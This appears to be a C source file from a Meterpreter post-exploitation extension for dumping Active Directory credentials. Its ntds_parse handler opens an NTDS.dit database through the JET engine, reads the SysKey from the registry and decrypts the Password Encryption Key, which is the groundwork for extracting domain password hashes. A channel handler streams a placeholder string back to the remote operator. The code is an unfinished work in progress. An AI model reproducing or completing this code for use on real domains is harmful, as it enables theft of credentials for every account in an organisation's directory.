#include "precomp.h"


typedef struct
{
	BOOL  eof;
} NTDSContext;


DWORD ntds_parse(Remote *remote, Packet *packet){
	Packet *response = packet_create_response(packet);
	DWORD res = ERROR_SUCCESS;
	jetState *ntdsState = malloc(sizeof(jetState));
	PCHAR filePath = packet_get_tlv_value_string(packet, TLV_TYPE_NTDS_PATH);
	// Check if the File exists
	if (0xffffffff == GetFileAttributes(filePath)){
		res = 2;
		goto out;
	}
	strncpy(ntdsState->ntdsPath, filePath, 255);

	// Attempt to get the SysKey from the Registry
	unsigned char sysKey[17];
	if (!get_syskey(sysKey)){
		res = GetLastError();
		goto out;
	}


	// Create the structure for holding all of the Column Definitions we need
	ntdsColumns *accountColumns = malloc(sizeof(ntdsColumns));
	memset(accountColumns, 0, sizeof(ntdsColumns));

	JET_ERR startupStatus = engine_startup(ntdsState);
	if (startupStatus != JET_errSuccess){
		exit(startupStatus);
	}
	// Start a Session in the Jet Instance
	JET_ERR sessionStatus = JetBeginSession(ntdsState->jetEngine, &ntdsState->jetSession, NULL, NULL);
	if (sessionStatus != JET_errSuccess){
		JetTerm(ntdsState->jetEngine);
		res = sessionStatus;
		goto out;
	}
	JET_ERR openStatus = open_database(ntdsState);
	if (openStatus != JET_errSuccess){
		JetEndSession(ntdsState->jetSession, (JET_GRBIT)NULL);
		JetTerm(ntdsState->jetEngine);
		res = openStatus;
		goto out;
	}
	JET_ERR tableStatus = JetOpenTable(ntdsState->jetSession, ntdsState->jetDatabase, "datatable", NULL, 0, JET_bitTableReadOnly | JET_bitTableSequential, &ntdsState->jetTable);
	if (tableStatus != JET_errSuccess){
		engine_shutdown(ntdsState);
		res = tableStatus;
		goto out;
	}
	JET_ERR columnStatus = get_column_info(ntdsState, accountColumns);
	if (columnStatus != JET_errSuccess){
		engine_shutdown(ntdsState);
		res = columnStatus;
		goto out;
	}
	JET_ERR pekStatus;
	encryptedPEK *pekEncrypted = malloc(sizeof(encryptedPEK));
	decryptedPEK *pekDecrypted = malloc(sizeof(decryptedPEK));
	memset(pekEncrypted, 0, sizeof(encryptedPEK));
	memset(pekDecrypted, 0, sizeof(decryptedPEK));

	pekStatus = get_PEK(ntdsState, accountColumns, pekEncrypted);
	if (pekStatus != JET_errSuccess){
		res = pekStatus;
		goto out;
	}
	if (!decrypt_PEK(sysKey, pekEncrypted, pekDecrypted)){
		res = GetLastError();
		goto out;
	}

out:
	packet_transmit_response(res, remote, response);
	return res;
}

DWORD ntds_test_channel(Remote *remote, Packet *packet){
	PoolChannelOps chops;
	Channel *newChannel;
	NTDSContext *ctx;
	DWORD res = ERROR_SUCCESS;
	Packet *response = packet_create_response(packet);

	// Allocate storage for the NTDS context
	if (!(ctx = calloc(1, sizeof(NTDSContext)))) {
		res = ERROR_NOT_ENOUGH_MEMORY;
		goto out;
	}

	memset(&chops, 0, sizeof(chops));

	// Initialize the pool operation handlers
	chops.native.context = ctx;
	chops.native.write = ntds_channel_write;
	chops.native.close = ntds_channel_close;
	chops.read = ntds_channel_read;

	// Allocate the pool channel
	if (!(newChannel = channel_create_pool(0, CHANNEL_FLAG_SYNCHRONOUS, &chops)))
	{
		res = ERROR_NOT_ENOUGH_MEMORY;
		goto out;
	}

	channel_set_type(newChannel, "ntds");
	packet_add_tlv_uint(response, TLV_TYPE_CHANNEL_ID, channel_get_id(newChannel));
	packet_transmit_response(res, remote, response);
out:
	return res;
}

static DWORD ntds_channel_write(Channel *channel, Packet *request,
	LPVOID context, LPVOID buffer, DWORD bufferSize, LPDWORD bytesWritten){
	return ERROR_SUCCESS;
}

static DWORD ntds_channel_read(Channel *channel, Packet *request,
	LPVOID context, LPVOID buffer, DWORD bufferSize, LPDWORD bytesRead){
	DWORD result = ERROR_SUCCESS;
	NTDSContext *ctx = (NTDSContext *)context;
	char testString[] = "This is a test of NTDS streaming";
	strncpy(buffer, testString, sizeof(testString));
	*bytesRead = sizeof(testString);
	return result;
}

static DWORD ntds_channel_close(Channel *channel, Packet *request,
	LPVOID context){
	return ERROR_SUCCESS;
}